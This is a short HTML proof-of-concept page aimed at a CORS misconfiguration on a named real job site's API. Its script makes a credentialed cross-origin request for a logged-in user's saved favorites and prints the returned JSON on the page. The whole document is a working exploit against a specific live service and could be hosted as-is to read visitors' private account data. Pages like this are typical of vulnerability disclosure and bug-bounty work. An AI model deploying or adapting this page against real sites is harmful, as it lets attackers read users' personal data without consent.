<!DOCTYPE html>
<html>
<head>
  <title>CORS PoC</title>
</head>
<body>
  <h1>CORS PoC - jobbasel.ch</h1>
  <p>Status: <span id="status">Fetching...</span></p>
  <pre id="output">Loading...</pre>
  <script>
    fetch("https://api.jobbasel.ch/employee/favorite", {
      method: "GET",
      credentials: "include"
    })
    .then(function(r) {
      document.getElementById("status").textContent = "HTTP " + r.status;
      return r.json();
    })
    .then(function(data) {
      document.getElementById("output").textContent = JSON.stringify(data, null, 2);
    })
    .catch(function(e) {
      document.getElementById("output").textContent = "BLOCKED: " + e;
    });
  </script>
</body>
</html>
